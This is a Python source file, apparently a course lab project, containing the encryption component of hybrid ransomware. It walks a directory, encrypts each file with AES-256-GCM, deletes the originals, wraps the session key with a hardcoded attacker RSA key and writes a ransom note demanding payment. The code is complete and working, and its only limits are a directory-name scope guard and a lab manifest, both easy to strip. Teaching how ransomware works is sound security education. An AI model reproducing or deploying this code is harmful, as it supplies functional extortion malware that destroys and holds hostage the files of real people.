#!/usr/bin/env python3
# =============================================================================
# CSCE 5550 - Ransomware Project 
# ransomware_encrypt.py  --  the ENCRYPTION component of the hybrid schema.
#
# Runs on the VICTIM machine (inside the isolated lab VM ONLY).
#
# Usage:
#   python3 ransomware_encrypt.py <target_dir> [--euid EUID]
# Example:
#   python3 ransomware_encrypt.py /home/victim/critical_abc0123
#
# The attacker's RSA-2048 PUBLIC key is HARDCODED below in PUBLIC_KEY_PEM:
# real ransomware embeds its public key in the payload exactly like this.
# The public key alone is useless to the victim - it can only WRAP the AES
# session key, never unwrap it - so shipping it with the malware is safe.
# Generate a fresh pair with attacker_keygen.py (on Kali) and paste the
# printed block into PUBLIC_KEY_PEM.
#
# What it does (hybrid-encryption schema):
#   1. Generates ONE random AES-256-GCM session key (32 bytes) for this run.
#   2. Recursively walks <target_dir> and encrypts EVERY regular file with
#      AES-256-GCM. Each file receives a FRESH random 96-bit nonce, stored
#      in that file's header (reusing a nonce under the same key would
#      break GCM security).
#   3. Wraps (RSA-OAEP encrypts) the AES session key with the hardcoded
#      RSA-2048 public key and stores it as key.bin.enc in the target root.
#      => Only the attacker's private key can unwrap it, so the victim is
#         unable to recover the session key by reverse-engineering anything.
#   4. Renames encrypted files to <name>.locked_<EUID>, drops a ransom note
#      (README_RESTORE.txt) containing the per-victim ID, and writes a
#      plaintext integrity manifest (.integrity_manifest.json) with SHA-256
#      checksums of every file taken BEFORE encryption. The manifest is a
#      LAB-ONLY verification aid: the decryptor uses it to prove lossless
#      recovery (real ransomware obviously would not leave one behind).
#
# Encrypted-file binary layout (all sizes in bytes):
#   MAGIC(8) | NONCE(12) | GCM-TAG(16) | CIPHERTEXT(...)
#
# SCOPE GUARD (safety + realism):
#   The tool refuses to run unless the target directory is named exactly
#   critical_<EUID>.
# =============================================================================

import os
import sys
import json
import hashlib
import argparse
from datetime import datetime

from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA

# =============================================================================
# HARDCODED ATTACKER PUBLIC KEY (pk)
# Run attacker_keygen.py on the Kali VM and paste the printed block here.
# This mirrors real ransomware, which embeds its public key in the payload;
# the victim needs NO key file for the encryption to run.
# =============================================================================
PUBLIC_KEY_PEM = """-----BEGIN PUBLIC KEY-----
PUBLIC_KEY_PEM here
-----END PUBLIC KEY-----"""

# --------------------------- customization ----------------------------------
# REPLACE 'EUID' with the EUID of one group member (project-description
# requirement: tasks include customizations based on Student/EUID values).
EUID = 'EUID'

# ------------------------------ constants ------------------------------------
MAGIC = b'CRLOCK1!'          # 8-byte marker identifying files of this tool (v1)
NONCE_LEN = 12               # 96-bit GCM nonce (NIST-recommended size)
TAG_LEN = 16                 # GCM authentication tag length
AES_KEY_LEN = 32             # 256-bit AES session key
KEY_FILE = 'key.bin.enc'     # RSA-wrapped AES session key (target root)
NOTE_FILE = 'README_RESTORE.txt' # Instructions for the restore
MANIFEST_FILE = '.integrity_manifest.json'   # plaintext checksums (lab aid)


# Load and validate the embedded public key; fail with a clear message if
# the placeholder has not been replaced yet.
def load_public_key():
    if 'PUBLIC_KEY_PEM' in PUBLIC_KEY_PEM:
        sys.exit('[error] PUBLIC_KEY_PEM is still the placeholder. Run '
                 'attacker_keygen.py on the attacker VM and paste the printed '
                 'public key block into PUBLIC_KEY_PEM at the top of this '
                 'file.')
    try:
        return RSA.import_key(PUBLIC_KEY_PEM)
    except ValueError:
        sys.exit('[error] PUBLIC_KEY_PEM is not a valid RSA key in PEM '
                 'format - re-copy the block printed by attacker_keygen.py.')


# SCOPE GUARD: only a directory named critical_<EUID> may be encrypted.
def validate_target(target_dir, euid):
    expected = 'critical_' + euid
    actual = os.path.basename(os.path.abspath(target_dir))
    if actual != expected:
        sys.exit('[SCOPE GUARD] refusing to run: target directory must be '
                 'named "%s", got "%s". This tool only operates inside the '
                 'authorized lab directory.' % (expected, actual))


# SHA-256 of an in-memory byte string, hex-encoded.
def sha256_bytes(data):
    return hashlib.sha256(data).hexdigest()


# Recursively list every regular file that must be encrypted.
# Skipped: files already encrypted by us (*.locked_EUID), our own artifacts
# (key.bin.enc, ransom note, integrity manifest) and non-regular files.
def collect_files(target_dir, ext):
    to_encrypt = []
    for root, dirs, files in os.walk(target_dir):
        for name in sorted(files):
            path = os.path.join(root, name)
            if not os.path.isfile(path) or os.path.islink(path):
                continue                      # only plain regular files
            if name.endswith(ext):
                continue                      # already encrypted (skip)
            if name in (KEY_FILE, NOTE_FILE, MANIFEST_FILE):
                continue                      # our own artifacts
            to_encrypt.append(path)
    return to_encrypt


# AES-256-GCM encrypt a single file IN PLACE (destroy the plaintext).
# Layout written: MAGIC(8) | NONCE(12) | TAG(16) | CIPHERTEXT
# Returns (bytes_written, locked_path).
def encrypt_one_file(path, session_key, ext):
    with open(path, 'rb') as f:
        plaintext = f.read()

    # Fresh, unique nonce for every file (CRITICAL for GCM security).
    nonce = get_random_bytes(NONCE_LEN)
    cipher = AES.new(session_key, AES.MODE_GCM, nonce=nonce, mac_len=TAG_LEN)
    ciphertext, tag = cipher.encrypt_and_digest(plaintext)

    locked_path = path + ext                 # notes.txt -> notes.txt.locked_EUID
    with open(locked_path, 'wb') as f:
        f.write(MAGIC + nonce + tag + ciphertext)

    os.remove(path)                          # destroy the plaintext copy
    return len(plaintext), locked_path


# Encrypt ("wrap") the AES session key with the ATTACKER'S HARDCODED RSA
# public key. RSA-OAEP padding is mandatory: "textbook RSA" is deterministic
# and trivially broken. Returns the wrapped key bytes.
def wrap_session_key(session_key, rsa_pub):
    cipher = PKCS1_OAEP.new(rsa_pub)
    return cipher.encrypt(session_key)


# Drop the ransom note; the victim ID identifies this infection.
def write_ransom_note(target_dir, victim_id):
    note = (
        '!! ALL FILES IN THIS DIRECTORY HAVE BEEN ENCRYPTED !!\n'
        '\n'
        'Your files were encrypted.\n'
        'Only the attacker holds the private key needed to recover it.\n'
        '\n'
        'Victim ID : %s\n'
        'Date      : %s\n'
        '\n'
        'How to recover your files:\n'
        '  1. Send the payment to the attacker (simulated in this lab via\n'
        '     scp of a payment proof file to the attacker VM).\n'
        '  2. After payment is verified you will receive the decryption\n'
        '     component (ransomware_decrypt.py) and the private key.\n'
        '\n'
        'WARNING: do NOT rename, move or modify the encrypted files\n'
        '(*.locked_*) and the key.bin.enc file.\n'
    ) % (victim_id, datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
    with open(os.path.join(target_dir, NOTE_FILE), 'w') as f:
        f.write(note)


def main():
    parser = argparse.ArgumentParser(
        description='CSCE 5550 project: hybrid-encryption ransomware (attack side).')
    parser.add_argument('target_dir', help='directory to encrypt (critical_EUID)')
    parser.add_argument('--euid', default=EUID,
                        help='override the EUID baked into the file name')
    args = parser.parse_args()

    euid = args.euid
    ext = '.locked_' + euid                 # extension depends on final EUID

    # ---- 0) scope guard: never run outside the authorized lab directory ----
    validate_target(args.target_dir, euid)
    if not os.path.isdir(args.target_dir):
        sys.exit('[error] target directory does not exist: %s' % args.target_dir)

    # ---- 1) load the HARDCODED attacker public key --------------------------
    rsa_pub = load_public_key()
    print('[ransomware] target   : %s' % os.path.abspath(args.target_dir))
    print('[ransomware] using embedded attacker public key (%d bits).'
          % rsa_pub.size_in_bits())

    # ---- 2) generate the per-run AES-256-GCM session key ---------------------
    session_key = get_random_bytes(AES_KEY_LEN)

    # ---- 3) inventory the files and record pre-encryption checksums ---------
    files = collect_files(args.target_dir, ext)
    if not files:
        sys.exit('[ransomware] nothing to encrypt (directory empty or already '
                 'encrypted).')

    manifest = {}
    for path in files:
        with open(path, 'rb') as f:
            data = f.read()
        rel = os.path.relpath(path, args.target_dir)
        manifest[rel] = {'sha256': sha256_bytes(data), 'size': len(data)}

    # Write the manifest
    with open(os.path.join(args.target_dir, MANIFEST_FILE), 'w') as f:
     json.dump(manifest, f, indent=2, sort_keys=True)

    # ---- 4) encrypt every file with AES-256-GCM (fresh nonce per file) ------
    total_bytes = 0
    for i, path in enumerate(files, 1):
        n, locked = encrypt_one_file(path, session_key, ext)
        total_bytes += n
        print('  [%d/%d] encrypted %s' % (i, len(files),
                                         os.path.relpath(locked, args.target_dir)))

    # ---- 5) wrap the AES session key with the hardcoded RSA public key ------
    wrapped = wrap_session_key(session_key, rsa_pub)
    with open(os.path.join(args.target_dir, KEY_FILE), 'wb') as f:
        f.write(wrapped)

    # Per-victim ID: derived from the wrapped key, so the attacker can match
    # a ransom payment to the right infection without keeping extra state.
    victim_id = sha256_bytes(wrapped)[:16].upper()

    # ---- 6) drop the ransom note --------------------------------------------
    write_ransom_note(args.target_dir, victim_id)

    print('[ransomware] DONE: %d files, %.2f KB encrypted.' %
          (len(files), total_bytes / 1024.0))
    print('[ransomware] session key wrapped with RSA-OAEP -> %s' % KEY_FILE)
    print('[ransomware] victim ID: %s' % victim_id)


if __name__ == '__main__':
    main()
